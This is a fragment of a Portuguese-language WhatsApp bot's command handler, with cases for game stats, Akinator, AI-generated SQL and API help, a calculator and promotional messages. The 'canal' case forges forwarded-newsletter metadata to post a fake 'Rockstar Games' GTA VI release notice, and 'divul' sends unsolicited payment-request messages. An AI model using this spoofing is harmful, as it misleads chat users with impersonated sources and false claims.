🏆 *Vitórias*
Solo: ${data.stats_gerais?.vitorias?.solo || 0}
Duo: ${data.stats_gerais?.vitorias?.duo || 0}
Squad: ${data.stats_gerais?.vitorias?.squad || 0}

💀 *K/D*
Solo: ${data.stats_gerais?.kd?.solo || 0}
Duo: ${data.stats_gerais?.kd?.duo || 0}
Squad: ${data.stats_gerais?.kd?.squad || 0}

🎯 *Taxa HS*
Solo: ${data.stats_gerais?.taxa_hs?.solo || 0}%
Duo: ${data.stats_gerais?.taxa_hs?.duo || 0}%
Squad: ${data.stats_gerais?.taxa_hs?.squad || 0}%
`;


if(data.imagens?.avatar){

await conn.sendMessage(from,{
image:{
url:data.imagens.avatar
},
caption:texto
},{
quoted:info
});

} else {

await conn.sendMessage(from,{
text:texto
},{
quoted:info
});

}


}catch(e){
console.log("ERRO FFSTALK:", e.response?.data || e);
reply("❌ Erro ao consultar Free Fire.");
}

}
break;

case 'akinator':
case 'aki': {
try {

const API = 'https://zone.api.br/api/akinator';
const KEY = 'API_KEY_SYSTEM';

const REACOES_AKI = [
  'https://files.catbox.moe/ux822e.jpg',

  'https://files.catbox.moe/48rnud.jpg',
  
  'https://files.catbox.moe/6adzva.jpg',

  'https://files.catbox.moe/us142h.jpeg',

  'https://files.catbox.moe/7g0cuo.jpg',

  'https://files.catbox.moe/s3cjrl.jpg',
];

const getReacaoAki = () => 
REACOES_AKI[Math.floor(Math.random() * REACOES_AKI.length)];

const id = sender || m.sender;

const call = (action, extra = {}) =>
axios.get(API, {
params:{
apikey:KEY,
action,
id,
...extra
}
}).then(r=>r.data);


const enviarPergunta = async (estado)=>{

if(!estado.pergunta){
return reply(`🧞 Não consegui continuar. Use ${prefix}aki novamente.`);
}


let texto = `
╭━━〔 🧞 AKINATOR 〕━━⬣

❓ Pergunta ${estado.passo + 1}
📊 Progresso: ${parseFloat(estado.progresso).toFixed(1)}%

${estado.pergunta}

💬 Responda pelos botões abaixo
╰━━━━━━━━━━━━━━⬣`;


let buttons=[
{
name:"quick_reply",
buttonParamsJson:JSON.stringify({
display_text:"✅ Sim",
id:`${prefix}aki s`
})
},
{
name:"quick_reply",
buttonParamsJson:JSON.stringify({
display_text:"❌ Não",
id:`${prefix}aki n`
})
},
{
name:"quick_reply",
buttonParamsJson:JSON.stringify({
display_text:"🤔 Não sei",
id:`${prefix}aki nsei`
})
},
{
name:"quick_reply",
buttonParamsJson:JSON.stringify({
display_text:"🤔 Provavelmente sim",
id:`${prefix}aki psim`
})
},
{
name:"quick_reply",
buttonParamsJson:JSON.stringify({
display_text:"🤷 Provavelmente não",
id:`${prefix}aki pnao`
})
},
{
name:"quick_reply",
buttonParamsJson:JSON.stringify({
display_text:"↩️ Voltar",
id:`${prefix}aki voltar`
})
}
];


let media;

try{

media = await prepareWAMessageMedia(
{image:{url:getReacaoAki()}},
{upload:conn.waUploadToServer}
);

}catch{}


const msg = generateWAMessageFromContent(from,{
interactiveMessage:{
body:{text:texto},
footer:{text:"🧞 Akinator"},
header:{
hasMediaAttachment:true,
imageMessage:media?.imageMessage
},
nativeFlowMessage:{
buttons
}
}
},{
userJid:conn.user.id,
quoted:selo
});


await conn.relayMessage(
from,
msg.message,
{
messageId:msg.key.id
});

};



const enviarPalpite = async (estado)=>{

let p = estado.palpite;


let texto = `
╭━━〔 🧞 AKINATOR 〕━━⬣

🎯 Acho que é:

👤 ${p.nome}

${p.descricao || ''}

Acertei?
╰━━━━━━━━━━━━━━⬣`;


let buttons=[
{
name:"quick_reply",
buttonParamsJson:JSON.stringify({
display_text:"✅ Acertou",
id:`${prefix}aki acertou`
})
},
{
name:"quick_reply",
buttonParamsJson:JSON.stringify({
display_text:"❌ Errou",
id:`${prefix}aki errou`
})
}
];


let media;

try{

media = await prepareWAMessageMedia(
{image:{url:getReacaoAki()}},
{upload:conn.waUploadToServer}
);

}catch{}


const msg = generateWAMessageFromContent(from,{
interactiveMessage:{
body:{text:texto},
footer:{text:"🧞 Akinator"},
header:{
hasMediaAttachment:true,
imageMessage:media?.imageMessage
},
nativeFlowMessage:{
buttons
}
}
},{
userJid:conn.user.id,
quoted:selo
});


await conn.relayMessage(
from,
msg.message,
{
messageId:msg.key.id
});

};



let sub=(q||'').toLowerCase().trim();


let mapa={
's':'s',
'sim':'s',

'n':'n',
'nao':'n',
'não':'n',

'nsei':'nsei',
'naosei':'nsei',

'psim':'t',
'provavelsim':'t',

'pnao':'t',
'provavelnao':'t'
};


if(!sub || sub=='start'){

await reagir(from,"🧞");

let data=await call('start');

return enviarPergunta(data);

}


if(sub=='voltar'){

let data=await call('back');

return data.adivinhou ? enviarPalpite(data) : enviarPergunta(data);

}


if(sub=='parar'){

await call('stop');

return reply("🧞 Partida encerrada.");

}


if(sub=='acertou'){

let data=await call('choice');

return reply(`🎉 Acertei! Era ${data.confirmado?.nome || 'ele'}`);

}


if(sub=='errou'){

let data=await call('exclude');

return data.adivinhou ? enviarPalpite(data) : enviarPergunta(data);

}


if(mapa[sub]){

let data=await call('answer',{
r:mapa[sub]
});

return data.adivinhou ? enviarPalpite(data) : enviarPergunta(data);

}


return reply(`
🧞 *Akinator*

Use:
${prefix}aki

Respostas:
s
n
nsei
p
pn

Outros:
voltar
parar
`);


}catch(e){

console.log('[AKINATOR ERROR]',e);

reply("❌ Está partida não está iniciada, ou você não é participante dela.");

}

}
break;

case 'lid':
case 'id':
case 'meuid': {
  try {

    const jid = m?.key?.participant || m?.key?.remoteJid || m?.sender || ''

    const isWhatsAppUser = jid.includes('@s.whatsapp.net')

    const number = isWhatsAppUser
      ? '+' + jid.split('@')[0]
      : '❌ não é número WhatsApp válido'

    const text = `
🆔 *SEU ID (LID)*

👤 Nome: ${m.pushName || 'Desconhecido'} 
🔖 JID: ${jid}
`

    await conn.relayMessage(from, {
      interactiveMessage: {
        body: { text },
        footer: { text: "Kyara ❤️‍🔥" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: "📋 Copiar ID",
                copy_code: jid
              })
            }
          ]
        }
      }
    }, {})

  } catch (e) {
    console.log(e)
    reply("❌ Erro ao pegar ID")
  }
}
break;

case 'canal': {
    try {
        const canalJid = '120363306546079744@newsletter';

        await conn.sendMessage(from, {
            react: {
                text: "🧪",
                key: info.key
            }
        });

        await conn.sendMessage(from, {
            text: `⚠️ *NOTICE* ⚠️\n\n Grand Theft Auto VI will be released tomorrow, July 5th, 2026.`,
            contextInfo: {
                forwardingScore: 127,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: canalJid,
                    serverMessageId: 1,
                    newsletterName: "Rockstar Games"
                }
            }
        });

    } catch (e) {
        console.log(e);
        reply(`❌ Erro ao enviar mensagem com canal:\n\n${e.message}`);
    }
}
break;

case 'statusvip': {
try {
const jid = from
const { randomBytes } = require('crypto')
const messageSecret = randomBytes(32)

const quoted = m?.quoted ||
m?.message?.extendedTextMessage?.contextInfo?.quotedMessage ||
null

const mime =
quoted?.imageMessage?.mimetype ||
quoted?.videoMessage?.mimetype ||
quoted?.audioMessage?.mimetype ||
''

const text = q?.trim() || ''

const closeFriends = {
contextInfo: {
isGroupStatus: true,
statusAudienceMetadata: {
audienceType: 1
}
}
}

async function sendExtras() {
try {
await conn.sendMessage(jid, {
text: '🛍️ Siga @kyara no TikTok.'
}, { quoted: m })
} catch {}

try {
await conn.relayMessage(jid, {
interactiveMessage: {
body: {
text: '💳 Pagamento Kyara Productions ©'
},
nativeFlowMessage: {
buttons: [{
name: 'inapp_signup',
buttonParamsJson: '{}'
}],
messageParamsJson: '{}'
}
}
}, {})
} catch {}
}

// TEXTO
if (!mime) {

if (!text)
return reply(`📌 Use:\n• ${prefix}statusvip seu texto\n• ou responda uma imagem, vídeo ou áudio.`)

const msgStatus = generateWAMessageFromContent(jid, {
messageContextInfo: { messageSecret },
groupStatusMessageV2: {
message: {
extendedTextMessage: {
text,
contextInfo: closeFriends.contextInfo
},
messageContextInfo: { messageSecret }
}
}
}, {})

await conn.relayMessage(jid, msgStatus.message, {
messageId: msgStatus.key.id
})

setTimeout(sendExtras, 1500)
break
}

// BAIXA MÍDIA
const buffer = await downloadMediaMessage(
{ message: quoted },
'buffer',
{},
{
logger: undefined,
reuploadRequest: conn.updateMediaMessage
}
)

if (!buffer) return reply('❌ Não consegui baixar essa mídia.')

// IMAGEM
if (/image/.test(mime)) {

const prep = await prepareWAMessageMedia(
{ image: buffer },
{ upload: conn.waUploadToServer }
)

const msgStatus = generateWAMessageFromContent(jid, {
messageContextInfo: { messageSecret },
groupStatusMessageV2: {
message: {
imageMessage: {
...prep.imageMessage,
caption: text,
contextInfo: closeFriends.contextInfo
},
messageContextInfo: { messageSecret }
}
}
}, {})

await conn.relayMessage(jid, msgStatus.message, {
messageId: msgStatus.key.id
})

setTimeout(sendExtras, 1500)
break
}

// VÍDEO
if (/video/.test(mime)) {

const prep = await prepareWAMessageMedia(
{ video: buffer },
{ upload: conn.waUploadToServer }
)

const msgStatus = generateWAMessageFromContent(jid, {
messageContextInfo: { messageSecret },
groupStatusMessageV2: {
message: {
videoMessage: {
...prep.videoMessage,
caption: text,
contextInfo: closeFriends.contextInfo
},
messageContextInfo: { messageSecret }
}
}
}, {})

await conn.relayMessage(jid, msgStatus.message, {
messageId: msgStatus.key.id
})

setTimeout(sendExtras, 1500)
break
}

// ÁUDIO
if (/audio/.test(mime)) {

const prep = await prepareWAMessageMedia(
{
audio: buffer,
mimetype: 'audio/mp4'
},
{
upload: conn.waUploadToServer
}
)

const msgStatus = generateWAMessageFromContent(jid, {
messageContextInfo: { messageSecret },
groupStatusMessageV2: {
message: {
audioMessage: {
...prep.audioMessage,
contextInfo: closeFriends.contextInfo
},
messageContextInfo: { messageSecret }
}
}
}, {})

await conn.relayMessage(jid, msgStatus.message, {
messageId: msgStatus.key.id
})

setTimeout(sendExtras, 1500)
break
}

reply('❌ Tipo de mídia não suportado.')

} catch (e) {
console.log('[STATUSVIP ERROR]', e)
reply(`❌ Erro ao enviar o status.\n\n${e?.message || e}`)
}
}
break;

case 'testf': {
    if (!So_Dono) return reply('Apenas o dono.');

    try {
        const { generateWAMessageFromContent } = require('@systemzero/baileys');

        const msg = generateWAMessageFromContent(m.chat, {
            interactiveMessage: {
                body: {
                    text: 'Siga @kyara no TikTok'
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: 'TikTok',
                                id: 'https://www.tiktok.com/@kyara'
                            })
                        }
                    ],
                    messageParamsJson: '{}'
                }
            }
        }, { userJid: m.sender });

        await conn.relayMessage(m.chat, msg.message, {
            messageId: msg.key.id
        });

    } catch (e) {
        console.error('[testf]', e);
        reply('Erro: ' + e.message);
    }

    break;
}

case 'divul': {
    if (!So_Dono) return reply('Apenas o dono.');
    try {
        const { data: imgBuffer } = await axios.get('https://files.catbox.moe/lwauqv.png', {
            responseType: 'arraybuffer'
        });
        const image = Buffer.from(imgBuffer);

        const { prepareWAMessageMedia } = require('@systemzero/baileys');
       //1
        await conn.sendMessage(m.chat, {
            paymentInviteServiceType: 3
        }, { quoted: m });
      
        //3
        await conn.sendMessage(m.chat, {
            orderText: '🛍️ Siga @kyara no TikTok',
            thumbnail: image
        }, { quoted: m });

        try {//4
            await conn.relayMessage(m.chat, {
                requestPaymentMessage: {
                    currencyCodeIso4217: 'BRL',
                    amount1000: 1000,
                    requestFrom: m.sender,
                    noteMessage: {
                        extendedTextMessage: { text: '💳 Solicitação de pagamento de Kyara Productions ©' }
                    },
                    expiryTimestamp: 0,
                    amount: { value: 1000, offset: 100, currencyCode: 'BRL' }
                }
            }, {});
        } catch (reqErr) {
            console.log('[TPAY request]', reqErr.message);
        }

        await conn.sendMessage(m.chat, { text: 'Siga @kyara no TikTok.' });
    } catch (e) {
        console.log('[TPAY ERRO]', e);
        await conn.sendMessage(m.chat, { text: '❌ Erro: ' + e.message });
    }
    break; }

case 'apiinfo': {
try {
const apiInfo = `╭━━〔 🌐 *INFORMAÇÕES DAS APIs* 〕━━⬣

🚀 *APIs Utilizadas pelo Bot*

🔹 *Lopes API*
🌍 https://lopes-api.store/
📌 Diversos endpoints para entretenimento, downloads, IA, ferramentas, imagens e muito mais.

━━━━━━━━━━━━━━━━━━

🔹 *SystemZone API*
🌍 https://systemzone.store/
📌 API completa contendo:
• 🖼️ Geradores Ephoto360
• 🤖 Inteligência Artificial
• 🔍 Consultas
• 🎵 Downloads
• 📸 Ferramentas de imagem
• 🛠️ Utilitários
• 📄 OCR
• 🔊 TTS (Texto para Voz)
• 🎤 Separação de Voz
• 🧹 RemoveBG
• 📈 Upscaler
• 📚 E muito mais...

━━━━━━━━━━━━━━━━━━

👨‍💻 *Desenvolvedor do Bot:*
Kyara</>

💡 *Observação:*
As APIs são constantemente atualizadas com novos recursos e melhorias.

╰━━━━━━━━━━━━━━━━━━⬣`;

await conn.sendMessage(from, {
text: apiInfo
}, { quoted: info });

} catch (e) {
console.error(e);
reply(`❌ Erro ao obter informações das APIs.`);
}
}
break;

case 'api':
case 'apidoc':
case 'gerarapi': {
try {
if (!q?.trim()) {
return reply(`🌐 *Exemplos:*
${prefix + command} API de login com JWT
${prefix + command} API de usuários em Node.js
${prefix + command} endpoint para buscar CEP
${prefix + command} API REST de produtos`);
}

await reagir(from, "🌐");

const GROQ_API_KEY = process.env.GROQ_API_KEY || "API_KEY_GROQ";

const pedido = q.trim();

const prompt = `
Você é especialista em APIs REST, Node.js, Express, Axios, JSON e documentação de endpoints.

Pedido do usuário: "${pedido}"

Retorne SOMENTE JSON válido:
{
  "titulo": "",
  "tipo": "",
  "descricao": "",
  "endpoint": "",
  "metodo": "",
  "headers": [["Header","Valor"]],
  "params": [["Parâmetro","Tipo","Descrição"]],
  "body_json": "",
  "exemplo_axios": "",
  "resposta_json": "",
  "observacoes": ""
}

Regras:
- Responda em português do Brasil.
- Não use markdown fora do JSON.
- endpoint deve parecer uma rota real.
- body_json deve ser JSON válido em texto.
- resposta_json deve ser JSON válido em texto.
- exemplo_axios deve ser código JavaScript usando axios.
`;

const { data } = await axios.post(
"https://api.groq.com/openai/v1/chat/completions",
{
model: "llama-3.3-70b-versatile",
messages: [
{ role: "system", content: "Responda somente JSON válido. Sem markdown." },
{ role: "user", content: prompt }
],
temperature: 0.1
},
{
headers: {
Authorization: `Bearer ${GROQ_API_KEY}`,
"Content-Type": "application/json"
},
timeout: 30000
}
);

let resposta = data?.choices?.[0]?.message?.content || "";
resposta = resposta.replace(/```json/gi, "").replace(/```/g, "").trim();

const inicio = resposta.indexOf("{");
const fim = resposta.lastIndexOf("}");
if (inicio === -1 || fim === -1) throw new Error("JSON não encontrado");

const json = JSON.parse(resposta.slice(inicio, fim + 1));

const headers = Array.isArray(json.headers) ? json.headers : [
["Header", "Valor"],
["Content-Type", "application/json"]
];

const params = Array.isArray(json.params) ? json.params : [
["Parâmetro", "Tipo", "Descrição"],
["-", "-", "Nenhum parâmetro informado"]
];

await conn.sendRich(from, [

conn.makeText(
`# 🌐 API GERADA

🔎 Pedido: *${pedido}*
📚 Tipo: *${json.tipo || "REST API"}*

## 📌 ${json.titulo || "Endpoint gerado"}

${json.descricao || "Documentação gerada para a API."}

## 🔗 Endpoint

\`${json.metodo || "GET"} ${json.endpoint || "/api/exemplo"}\``
),

conn.makeTable(headers),

conn.makeTable(params),

conn.makeText(`## 📦 Body JSON`),

conn.makeCode("json", json.body_json || "{}"),

conn.makeText(`## ⚡ Exemplo Axios`),

conn.makeCode("javascript", json.exemplo_axios || `const axios = require("axios");`),

conn.makeText(`## ✅ Resposta esperada`),

conn.makeCode("json", json.resposta_json || "{}"),

conn.makeText(
`## ⚠️ Observações

${json.observacoes || "Teste o endpoint antes de usar em produção."}`
)

], info, [
"RICH_RESPONSE_CODE",
"RICH_RESPONSE_TABLE"
]);

await reagir(from, "✅");

} catch (e) {
console.log("ERRO API:", e?.response?.data || e);
await reagir(from, "❌");
reply("❌ Erro ao gerar documentação da API.");
}
}
break;

case 'sql':
case 'querysql': {
try {
if (!q?.trim()) {
return reply(`🗄️ *Exemplos:*
${prefix + command} criar tabela de usuários
${prefix + command} selecionar todos os admins
${prefix + command} atualizar saldo do usuário
${prefix + command} fazer join entre usuarios e grupos`);
}

await reagir(from, "🗄️");

const GROQ_API_KEY = process.env.GROQ_API_KEY || "API_KEY_GROQ";

const pedido = q.trim();

const prompt = `
Você é especialista em SQL, MySQL, MariaDB, PostgreSQL e SQLite.

Pedido do usuário: "${pedido}"

Retorne SOMENTE JSON válido:
{
  "titulo": "",
  "banco": "",
  "descricao": "",
  "sql": "",
  "tabela": [["Comando","Função"]],
  "observacoes": "",
  "melhoria": ""
}

Regras:
- Responda em português do Brasil.
- Não use markdown fora do JSON.
- sql deve conter somente o código SQL.
- Seja direto e útil.
`;

const { data } = await axios.post(
"https://api.groq.com/openai/v1/chat/completions",
{
model: "llama-3.3-70b-versatile",
messages: [
{ role: "system", content: "Responda somente JSON válido. Sem markdown." },
{ role: "user", content: prompt }
],
temperature: 0.1
},
{
headers: {
Authorization: `Bearer ${GROQ_API_KEY}`,
"Content-Type": "application/json"
},
timeout: 30000
}
);

let resposta = data?.choices?.[0]?.message?.content || "";
resposta = resposta.replace(/```json/gi, "").replace(/```/g, "").trim();

const inicio = resposta.indexOf("{");
const fim = resposta.lastIndexOf("}");
if (inicio === -1 || fim === -1) throw new Error("JSON não encontrado");

const json = JSON.parse(resposta.slice(inicio, fim + 1));

let tabela = Array.isArray(json.tabela) ? json.tabela : [
["Comando", "Função"],
["SQL", "Consulta gerada"]
];

await conn.sendRich(from, [

conn.makeText(
`# 🗄️ SQL GERADO

🔎 Pedido: *${pedido}*
📚 Banco: *${json.banco || "SQL"}*

## 📌 ${json.titulo || "Consulta SQL"}

${json.descricao || "Consulta gerada conforme o pedido."}`
),

conn.makeCode("sql", json.sql || "-- Nenhum SQL gerado"),

conn.makeTable(tabela),

conn.makeText(
`## ⚠️ Observações

${json.observacoes || "Teste em um banco de desenvolvimento antes de usar em produção."}

## 🚀 Melhoria

${json.melhoria || "Use índices e filtros para melhorar performance."}`
)

], info, [
"RICH_RESPONSE_CODE",
"RICH_RESPONSE_TABLE"
]);

await reagir(from, "✅");

} catch (e) {
console.log("ERRO SQL:", e?.response?.data || e);
await reagir(from, "❌");
reply("❌ Erro ao gerar SQL.");
}
}
break;

case 'erro':
case 'error':
case 'bug': {
try {
if (!q?.trim()) {
return reply(`🐞 *Exemplo:*\n${prefix + command} SyntaxError: Unexpected token }\n${prefix + command} Cannot find module axios`);
}

await reagir(from, "🔎");

const GROQ_API_KEY = process.env.GROQ_API_KEY || "API_KEY_GROQ";

const erroUser = q.trim();

const prompt = `
Você é especialista em Node.js, JavaScript, Termux, Baileys e bots WhatsApp.

Analise este erro:
"${erroUser}"

Retorne SOMENTE JSON válido:
{
  "titulo": "",
  "tipo": "",
  "causa": "",
  "solucao": "",
  "codigo_corrigido": "",
  "passos": [["Passo","O que fazer"]],
  "dica": ""
}

Regras:
- Responda em português do Brasil.
- Não use markdown fora do JSON.
- Seja direto e prático.
- codigo_corrigido deve conter um exemplo útil.
`;

const { data } = await axios.post(
"https://api.groq.com/openai/v1/chat/completions",
{
model: "llama-3.3-70b-versatile",
messages: [
{ role: "system", content: "Responda somente JSON válido. Sem markdown." },
{ role: "user", content: prompt }
],
temperature: 0.1
},
{
headers: {
Authorization: `Bearer ${GROQ_API_KEY}`,
"Content-Type": "application/json"
},
timeout: 30000
}
);

let resposta = data?.choices?.[0]?.message?.content || "";

resposta = resposta.replace(/```json/gi, "").replace(/```/g, "").trim();

const inicio = resposta.indexOf("{");
const fim = resposta.lastIndexOf("}");
if (inicio === -1 || fim === -1) throw new Error("JSON não encontrado");

const json = JSON.parse(resposta.slice(inicio, fim + 1));

let tabela = Array.isArray(json.passos) ? json.passos : [
["Passo", "O que fazer"],
["1", "Verifique o trecho do erro"]
];

await conn.sendRich(from, [

conn.makeText(
`# 🐞 ANÁLISE DE ERRO

🔎 Erro enviado:
\`\`\`text
${erroUser}
\`\`\`

## 📌 ${json.titulo || "Erro analisado"}

📂 Tipo: *${json.tipo || "Não identificado"}*

## ⚠️ Causa provável

${json.causa || "Não informada."}

## ✅ Solução

${json.solucao || "Não informada."}`
),

conn.makeCode("Error", json.codigo_corrigido || "// Sem código corrigido"),

conn.makeTable(tabela),

conn.makeText(
`## 💡 Dica

${json.dica || "Leia o console completo para achar a linha exata do erro."}`
)

], info, [
"RICH_RESPONSE_CODE",
"RICH_RESPONSE_TABLE"
]);

await reagir(from, "✅");

} catch (e) {
console.log("ERRO CASE ERRO:", e?.response?.data || e);
await reagir(from, "❌");
reply("❌ Não consegui analisar esse erro.");
}
}
break;

case 'calc':
case 'calcular':
case 'matematica': {
try {
if (!q?.trim()) {
return reply(`🧮 *Exemplos:*
${prefix + command} 2+2*5
${prefix + command} sqrt(144)
${prefix + command} 10% de 250
${prefix + command} derivada x^3 + 2x
${prefix + command} simplificar 2x + 3x - x
${prefix + command} resolver x^2 - 5x + 6`);
}

await reagir(from, "🧮");

const math = require("mathjs");

let entrada = q.trim();
let resultado = "";
let tipo = "Cálculo";
let codigo = "";
let explicacao = "";
let curiosidade = "";
let complexidade = "Fácil";

let tabela = [
["Item", "Valor"],
["Entrada", entrada]
];

function limparConta(txt) {
return txt
.replace(/÷/g, "/")
.replace(/×/g, "*")
.replace(/,/g, ".")
.replace(/π/g, "pi")
.replace(/√\s*\(?([0-9.]+)\)?/gi, "sqrt($1)")
.replace(/(\d+(?:\.\d+)?)\s*%\s*de\s*(\d+(?:\.\d+)?)/gi, "($1/100)*($2)");
}

function detectarFuncoes(expr) {
const lista = [];
if (/sqrt\(/i.test(expr)) lista.push("Raiz quadrada");
if (/sin\(/i.test(expr)) lista.push("Seno");
if (/cos\(/i.test(expr)) lista.push("Cosseno");
if (/tan\(/i.test(expr)) lista.push("Tangente");
if (/log10\(/i.test(expr)) lista.push("Logaritmo base 10");
if (/log\(/i.test(expr)) lista.push("Logaritmo");
if (/\^/.test(expr)) lista.push("Potência");
if (/%/.test(entrada) || /\*\/100|\/100/i.test(expr)) lista.push("Porcentagem");
return lista.length ? lista.join(", ") : "Operações básicas";
}

function definirComplexidade(expr) {
let pontos = 0;
if (expr.length > 20) pontos++;
if (expr.length > 45) pontos++;
if (/\^/.test(expr)) pontos++;
if (/sqrt|sin|cos|tan|log/i.test(expr)) pontos += 2;
if ((expr.match(/\(/g) || []).length >= 3) pontos++;
if (/derivada|simplificar|resolver/i.test(entrada)) pontos += 2;

if (pontos <= 1) return "Fácil";
if (pontos <= 3) return "Média";
if (pontos <= 5) return "Difícil";
return "Avançada";
}

function explicarNumerica(expr, resultado) {
let partes = [];

if (expr.includes("(")) partes.push("• Primeiro são resolvidos os parênteses.");
if (/\^/.test(expr)) partes.push("• Depois são calculadas as potências.");
if (/sqrt\(/i.test(expr)) partes.push("• `sqrt(...)` significa raiz quadrada.");
if (/sin\(/i.test(expr)) partes.push("• `sin(...)` calcula o seno em radianos.");
if (/cos\(/i.test(expr)) partes.push("• `cos(...)` calcula o cosseno em radianos.");
if (/tan\(/i.test(expr)) partes.push("• `tan(...)` calcula a tangente em radianos.");
if (/log10\(/i.test(expr)) partes.push("• `log10(...)` calcula logaritmo na base 10.");
if (/%\s*de/i.test(entrada)) partes.push("• A porcentagem foi convertida para multiplicação.");

if (!partes.length) {
partes.push("• A conta foi resolvida seguindo a ordem normal da matemática.");
}

return partes.join("\n") + `\n\n✅ Resultado final: *${resultado}*`;
}

function explicarNotacao(resultado) {
if (!String(resultado).includes("e+")) return "";

const [base, exp] = String(resultado).split("e+");
const aproximado = Number(resultado).toLocaleString("pt-BR", {
maximumFractionDigits: 10
});

return `## 🔬 Notação científica

O resultado apareceu com \`e+\`.

Isso significa:

\`\`\`text
${resultado} = ${base} × 10^${exp}
\`\`\`

Aproximadamente:

\`\`\`text
${aproximado}
\`\`\``;
}

let expr = limparConta(entrada);
complexidade = definirComplexidade(expr);

if (/^derivada\s+/i.test(expr)) {
tipo = "Derivada";
expr = expr.replace(/^derivada\s+/i, "").trim();

const derivada = math.derivative(expr, "x").toString();

resultado = derivada;
codigo = `f(x) = ${expr}\nf'(x) = ${derivada}`;

explicacao = `A derivada mostra como uma função muda em relação a uma variável.

Neste caso, a variável usada foi *x*.

Resultado:
${derivada}`;

curiosidade = "Derivadas são muito usadas em física, engenharia, economia e inteligência artificial.";

tabela.push(["Tipo", "Derivada"]);
tabela.push(["Variável", "x"]);
tabela.push(["Funções usadas", "derivative"]);
tabela.push(["Complexidade", complexidade]);
tabela.push(["Resultado", derivada]);

} else if (/^simplificar\s+/i.test(expr)) {
tipo = "Simplificação";
expr = expr.replace(/^simplificar\s+/i, "").trim();

const simp = math.simplify(expr).toString();

resultado = simp;
codigo = `${expr} = ${simp}`;

explicacao = `A simplificação reduz a expressão juntando termos semelhantes.

Expressão original:
${expr}

Forma simplificada:
${simp}`;

curiosidade = "Simplificar expressões ajuda a deixar contas maiores mais fáceis de resolver.";

tabela.push(["Tipo", "Simplificação"]);
tabela.push(["Funções usadas", "simplify"]);
tabela.push(["Complexidade", complexidade]);
tabela.push(["Resultado", simp]);

} else if (/^resolver\s+/i.test(expr)) {
tipo = "Equação";
expr = expr.replace(/^resolver\s+/i, "").trim();

let eq = expr.includes("=") ? expr : `${expr}=0`;
let [ladoA, ladoB] = eq.split("=").map(x => x.trim());

let polinomio = math.simplify(`(${ladoA}) - (${ladoB})`).toString();

let roots = [];

try {
const node = math.parse(polinomio);
const compiled = node.compile();

for (let i = -100; i <= 100; i++) {
let a = i;
let b = i + 1;
let fa = compiled.evaluate({ x: a });
let fb = compiled.evaluate({ x: b });

if (fa === 0) roots.push(a);

if (fa * fb < 0) {
let low = a;
let high = b;

for (let j = 0; j < 60; j++) {
let mid = (low + high) / 2;
let fm = compiled.evaluate({ x: mid });

if (Math.abs(fm) < 1e-10) {
low = high = mid;
break;
}

if (fa * fm < 0) {
high = mid;
} else {
low = mid;
fa = fm;
}
}

roots.push(Number(((low + high) / 2).toFixed(8)));
}
}

roots = [...new Set(roots.map(String))];

resultado = roots.length ? roots.join(", ") : "Não encontrei raízes simples.";
codigo = `${eq}\n${polinomio} = 0\nx = ${resultado}`;

explicacao = `Para resolver, o bot transformou a equação em uma forma igual a zero.

Equação:
${eq}

Forma analisada:
${polinomio} = 0`;

curiosidade = "Resolver equações significa encontrar valores de x que tornam a igualdade verdadeira.";

tabela.push(["Tipo", "Resolver equação"]);
tabela.push(["Equação", eq]);
tabela.push(["Complexidade", complexidade]);
tabela.push(["Resultado", resultado]);

} catch {
resultado = "Não consegui resolver essa equação.";
codigo = eq;
explicacao = "A equação não pôde ser resolvida automaticamente.";
}

} else {
tipo = "Conta numérica";

const valor = math.evaluate(expr);

resultado = typeof valor === "number"
? math.format(valor, { precision: 14 })
: String(valor);

codigo = `${entrada}\n\nNormalizado:\n${expr}\n\nResultado:\n${resultado}`;

explicacao = explicarNumerica(expr, resultado);

curiosidade = "Em contas com `sin`, `cos` e `tan`, o mathjs usa radianos, não graus.";

tabela.push(["Tipo", "Conta"]);
tabela.push(["Expressão normalizada", expr]);
tabela.push(["Funções usadas", detectarFuncoes(expr)]);
tabela.push(["Complexidade", complexidade]);
tabela.push(["Resultado", resultado]);
}

const notacao = explicarNotacao(resultado);

await conn.sendRich(from, [

conn.makeText(
`# 🧮 CÁLCULO MATEMÁTICO

Olá @${sender.split("@")[0]}!

🔎 Pedido: *${entrada}*
📚 Tipo: *${tipo}*
⚡ Complexidade: *${complexidade}*

## ✅ Resultado

**${resultado}**`
),

conn.makeCode("Matemática", codigo),

conn.makeTable(tabela),

conn.makeText(
`## 🧠 Explicação

${explicacao}

${notacao}

## 💡 Curiosidade

${curiosidade}

## 📌 Dicas

• Use \`*\` para multiplicar.
• Use \`/\` para dividir.
• Use \`sqrt(25)\` para raiz.
• Use \`^2\` para potência.
• Use \`sin(pi/6)\`, \`cos(pi)\`, \`tan(pi/4)\`.
• Use \`log10(1000000)\`.
• Use \`10% de 250\`.
• Use \`derivada x^2 + 3x\`.
• Use \`simplificar 2x + 3x\`.
• Use \`resolver x^2 - 5x + 6\`.`
)

], info, [
"RICH_RESPONSE_CODE",
"RICH_RESPONSE_TABLE"
]);

await reagir(from, "✅");

} catch (e) {
console.log("ERRO CALC:", e);
await reagir(from, "❌");
reply("❌ Erro ao calcular. Verifique se a conta está correta.");
}
}
break;

case 'dissecar':
case 'inspect':
case 'raiox': {
try {
const ctx = info.message?.extendedTextMessage?.contextInfo;
const citada = ctx?.quotedMessage;

if (!citada) {
return reply(`🔬 *Dissecar*

Responda/marque uma mensagem com:
${prefix + command}

Eu mostro a estrutura completa dela.`);
}

await reagir(from, "🔬");

function makeReplacer() {
const vistos = new WeakSet();

return (k, v) => {
if (typeof v === "bigint") return v.toString() + "n";

if (v && v.type === "Buffer" && Array.isArray(v.data)) {
return `<Buffer ${v.data.length} bytes>`;
}

if (v instanceof Uint8Array) {
return `<Bytes ${v.length}>`;
}

if (
v &&
typeof v === "object" &&
v.low !== undefined &&
v.high !== undefined &&
v.unsigned !== undefined
) {
try {
return Number(v.toString());
} catch {
return String(v);
}
}

if (v && typeof v === "object") {
if (vistos.has(v)) return "[Circular]";
vistos.add(v);
}

return v;
};
}

function procurar(obj, alvos, achados = new Set(), prof = 0) {
if (!obj || typeof obj !== "object" || prof > 12) return achados;

for (const k of Object.keys(obj)) {
if (alvos.includes(k)) achados.add(k);

const valor = obj[k];

if (
valor &&
typeof valor === "object" &&
!(valor instanceof Uint8Array) &&
valor.type !== "Buffer"
) {
